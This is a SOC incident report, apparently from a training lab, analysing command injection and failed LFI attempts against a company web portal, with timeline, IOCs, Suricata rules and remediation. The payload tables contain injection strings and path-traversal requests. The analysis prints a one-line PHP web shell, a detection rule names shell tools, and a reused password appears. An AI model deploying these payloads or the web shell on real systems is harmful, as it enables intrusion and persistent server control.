# Incident Report: INC-2026-005
## OS Command Injection and Local File Inclusion Attempt
**Analyst:** Andre Penas, SOC Analyst L1, BeCode Corp
**Client:** NexaCorp Industries
**Reported by:** Marc Wauters, IT Infrastructure Manager
**Incident date:** Friday, 5 June 2026
**Report date:** 12 June 2026
**Classification:** Confidential

---

## Executive Summary

On Friday 5 June 2026, the NexaCorp employee portal (bru-web-01) was attacked by an external threat actor originating from IP address 172.16.50.10. The attacker exploited a diagnostic ping utility that passed user input directly to the operating system without sanitisation, gaining the ability to run arbitrary commands on the server. Through this command injection vulnerability, the attacker read the system user list, mapped the web server file structure, identified the OS version, and planted a PHP backdoor (web shell) on the server. A separate file viewer feature was also probed for local file inclusion, but those attempts failed. After deploying the web shell, the attacker used credentials belonging to employee j.martin to log in to the server via SSH, establishing persistent access. Immediate containment actions are required.

---

## Incident Timeline

All timestamps are CEST (UTC+2) from the Apache access log and auth.log.

| Time | Event |
|---|---|
| 08:00:02 | Attacker authenticates to the portal using j.martin credentials (`P@ssw0rd123`) |
| 11:11:59 | First POST to `/dvwa/vulnerabilities/exec/` with a legitimate-looking ping payload (baseline probe) |
| 11:53:30 | First command injection: `127.0.0.1;id` |
| 12:10:20 | Second injection: `127.0.0.1;whoami` |
| 12:47:59 | LFI baseline request: `?page=include.php` (5510 bytes response) |
| 12:57:24 | LFI attempt: `?page=../../../../etc/passwd` (3868 bytes, same as all subsequent LFI attempts) |
| 13:35:17 | Command injection: `127.0.0.1;cat /etc/passwd` (response 6735 bytes, notably larger) |
| 13:49:04 | LFI attempt: `?page=../../../../etc/os-release` (failed, 3868 bytes) |
| 14:15:47 | Command injection: `127.0.0.1;ls -la /var/www/html/` |
| 14:25:00 | LFI attempt: `?page=../../../../var/log/apache2/access.log` (failed, 3868 bytes) |
| 14:54:21 | Command injection: `127.0.0.1;uname -a` |
| 15:13:46 | LFI attempt: `?page=../../../../var/www/html/dvwa/config/config.inc.php` (failed, 3868 bytes) |
| 15:34:04 | Command injection: writes PHP web shell to `/var/www/html/shell.php` |
| 15:35:40 | Web shell first use: `GET /shell.php?cmd=id` |
| 15:37:23 | Web shell second use: `GET /shell.php?cmd=ls+-la+/var/www/html/` |
| 15:47:15 | SSH login as `j.martin` from 172.16.50.10 (three successive sessions) |

---

## Technical Analysis

### Vulnerability 1: OS Command Injection

**Endpoint:** `POST /dvwa/vulnerabilities/exec/`

The portal's ping diagnostic tool passed the `ip` form parameter directly to an OS-level ping command without validation. By appending a semicolon followed by an arbitrary command, the attacker was able to chain additional OS commands onto the ping call.

**Payloads executed (decoded from URL encoding):**

| Timestamp | Decoded payload | Purpose |
|---|---|---|
| 11:11:59 | `127.0.0.1` | Baseline ping, confirm the feature works |
| 11:53:30 | `127.0.0.1;id` | Confirm command execution, identify running user |
| 12:10:20 | `127.0.0.1;whoami` | Confirm user context |
| 13:35:17 | `127.0.0.1;cat /etc/passwd` | Read full system user list |
| 14:15:47 | `127.0.0.1;ls -la /var/www/html/` | Map the web server directory |
| 14:54:21 | `127.0.0.1;uname -a` | Read OS and kernel version |
| 15:34:04 | `127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php` | Deploy web shell |

The server process runs as `www-data`. All commands executed under that user context.

### Vulnerability 2: Local File Inclusion (attempted, unsuccessful)

**Endpoint:** `GET /dvwa/vulnerabilities/fi/?page=`

The attacker attempted to read four server-side files using path traversal in the `page` parameter:

| Timestamp | Requested path |
|---|---|
| 12:57:24 | `../../../../etc/passwd` |
| 13:49:04 | `../../../../etc/os-release` |
| 14:25:00 | `../../../../var/log/apache2/access.log` |
| 15:13:46 | `../../../../var/www/html/dvwa/config/config.inc.php` |

All four requests returned exactly 3868 bytes. The baseline request (`?page=include.php`) returned 5510 bytes. The consistent response size confirms the server did not include the requested files and returned the same default/error page each time. **The LFI vulnerability was not exploitable at the application's current security level.** No data was exposed through this channel.

### Web Shell and Persistence

At 15:34:04, the attacker used the command injection to write the following PHP file to the web root:

```
/var/www/html/shell.php
Content: <?php system($_GET["cmd"]); ?>
```

This file accepts any OS command via the `cmd` GET parameter and executes it on the server. It was used twice within minutes of creation and remains on the server unless removed.

### SSH Lateral Movement

At 15:47:15, the attacker made three successive SSH logins as user `j.martin` from IP 172.16.50.10. The credentials (`j.martin` / `P@ssw0rd123`) were visible in the PCAP login POST at 08:00:02, and are the same credentials used to authenticate to the web portal. This confirms the attacker obtained valid credentials before the attack window and leveraged them for persistent SSH access after deploying the web shell.

---

## Indicators of Compromise

| Type | Value |
|---|---|
| Attacker IP | 172.16.50.10 |
| Compromised account | j.martin |
| Backdoor file | `/var/www/html/shell.php` |
| Command injection endpoint | `/dvwa/vulnerabilities/exec/` |
| LFI endpoint (probed) | `/dvwa/vulnerabilities/fi/` |
| Payload pattern (command injection) | `ip=127.0.0.1%3B<command>` (`%3B` = `;`) |
| Payload pattern (LFI) | `page=../../../../<path>` |
| Web shell access pattern | `GET /shell.php?cmd=<command>` |
| Credential exposed in PCAP | `username=j.martin&password=P%40ssw0rd123` |

---

## Persistence and Consequence

The attacker achieved two forms of persistence on `bru-web-01`:

1. **Web shell at `/var/www/html/shell.php`:** Accessible without authentication from any browser. Allows full OS command execution as `www-data`. The file remains on the server until removed.

2. **SSH access as `j.martin`:** Three successful SSH logins from 172.16.50.10 at 15:47. The sessions were short (likely automated or scripted), but the attacker has demonstrated they hold working SSH credentials for this server.

This server is the same one compromised in INC-2026-004 (SQL injection, 30 May 2026). The attacker returned within one week of the previous incident and pivoted to a different attack surface. Persistent access on `bru-web-01` likely feeds into the next attack phase, which may target internal systems reachable from this server.

---

## Detection Recommendations

The following Suricata rules would have detected this attack. They were tested by replaying `attack.pcap` through Suricata and confirmed to fire only on attacker traffic (no false positives on employee or background scanner traffic).

### Rule 1: OS command separator in POST body

```suricata
alert http any any -> any any (
  msg:"CMDINJ - OS command separator in POST body";
  http.method; content:"POST";
  http.request_body; pcre:"/[|;&`]\s*(id|whoami|uname|cat|ls|wget|curl|bash|sh)/i";
  sid:1000001; rev:1;
)
```

### Rule 2: Path traversal in URI

```suricata
alert http any any -> any any (
  msg:"LFI - Path traversal in URI";
  http.uri; content:"../";
  sid:1000002; rev:1;
)
```

### Rule 3: Server response leaking /etc/passwd content

```suricata
alert http any any -> any any (
  msg:"LFI/CMDINJ - Server response contains passwd file content";
  file_data; content:"root:x:0:0";
  sid:1000003; rev:1;
)
```

### Proof of detection (fast.log excerpt after PCAP replay)

```
06/05/2026-10:57:24  [1:1000002:1] LFI - Path traversal in URI  172.16.50.10:46880 -> 192.168.10.22:80
06/05/2026-11:49:04  [1:1000002:1] LFI - Path traversal in URI  172.16.50.10:44328 -> 192.168.10.22:80
06/05/2026-12:25:00  [1:1000002:1] LFI - Path traversal in URI  172.16.50.10:57720 -> 192.168.10.22:80
06/05/2026-13:13:46  [1:1000002:1] LFI - Path traversal in URI  172.16.50.10:56844 -> 192.168.10.22:80
```

### False positive analysis

No alerts fired on traffic from employee IPs (`192.168.10.100-116`) or background internet scanners (`172.16.50.20-26`). Rules are specific enough for production deployment.

---

## Remediation Recommendations

### Immediate (within 24 hours)

1. **Remove the web shell.** Delete `/var/www/html/shell.php` from `bru-web-01` immediately. Verify no other `.php` files were written to the web root during or after the attack window by running `find /var/www/html -newer /var/log/apache2/access.log -name "*.php"`.

2. **Reset j.martin's credentials.** The account password (`P@ssw0rd123`) is fully compromised. Force a password reset and revoke any active SSH sessions. Audit whether j.martin's credentials are reused on other internal systems.

3. **Take the diagnostic tools offline.** Disable or remove the `/dvwa/vulnerabilities/exec/` and `/dvwa/vulnerabilities/fi/` pages. These features have no legitimate production purpose and have now been abused in two consecutive incidents.

### Short-term (within one week)

4. **Sanitise all OS-facing inputs.** Any feature that passes user input to the OS must use an explicit allowlist (e.g. only accept valid IP address format for a ping tool). Never use `shell_exec()`, `system()`, or `exec()` with unsanitised user data.

5. **Deploy the Suricata rules above** on the NexaCorp network perimeter and on the `bru-web-01` host agent.

6. **Audit `bru-web-01` for further compromise.** Check crontabs (`crontab -l -u www-data`), SSH `authorized_keys` files, and any files modified after 15:34 on 5 June. Run `find / -newer /var/www/html/shell.php -not -path "/proc/*" 2>/dev/null` to identify all files touched after the web shell was created.

### Longer-term

7. **Enforce the principle of least privilege.** The `www-data` user was able to write files to `/var/www/html/`. The web server process should not have write access to the web root at runtime.

8. **Implement a Web Application Firewall (WAF)** to block path traversal and command injection patterns before they reach the application.

---

*BeCode Corp, Incident Response Division*
*Classification: Confidential, NexaCorp use only*
